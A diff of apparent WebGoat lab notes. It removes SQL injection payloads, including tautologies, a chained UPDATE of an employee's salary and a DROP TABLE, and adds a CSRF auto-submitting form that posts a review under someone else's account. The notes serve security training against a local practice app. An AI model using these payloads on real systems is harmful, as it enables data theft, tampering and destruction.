@@ -1,42 +1,14 @@
-### wehave to write query to select specific user
-i used user id from previous page
+### CSRF Exercise
+submit query goes to = 'http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag?csrf=false&submit=Submit+Query'
+on setting csrf=true we get flag
+### Post a review on someone else’s behalf
+just make an html page with form
 ```
-SELECT * FROM employees WHERE userid=96134
-```
-### create table
-```
-ALTER TABLE employees ADD phone VARCHAR(20)
-```
-
-### sql injection with options
-we need to make query like
-```
- SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'
- ```
-### numeric SQL injection
-Login_count is to be integer <br/>
-we put Login_count=1 and userid = 1 OR 1=1
-query become
-```
-SELECT * From user_data WHERE Login_Count = 1 and userid= 1 OR 1=1
-```
-### String SQL injection
-we put lastname = ' OR 1=1 OR ''= '<br />
-auth_tan = ' OR 1=1-- <br />
-Query becomes
-```
-SELECT * FROM employees WHERE last_name = '' OR 1=1 OR ''= '' AND auth_tan = '' OR 1=1--'
-```
-
-### Query chaining
-we just chain an update with our query
-```
-employee_name = 'Smith'
-auth_tan = 3SL99A' ;UPDATE employees SET salary=100000 WHERE last_name='Smith'--
-```
-
-### Compromising Availability 
-
-```
-search = ';DROP TABLE access_log
+<body onload="document.getElementById('csrf-review').submit();">
+	<form accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form" successcallback="" action="http://127.0.0.1:8080/WebGoat/csrf/review">
+       <input type="hidden" class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review" type="text" value="bad review">
+       <input type="hidden" class="form-control" id="reviewStars" name="stars" type="text" value=3>
+       <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+  </form>
+</body>
 ```
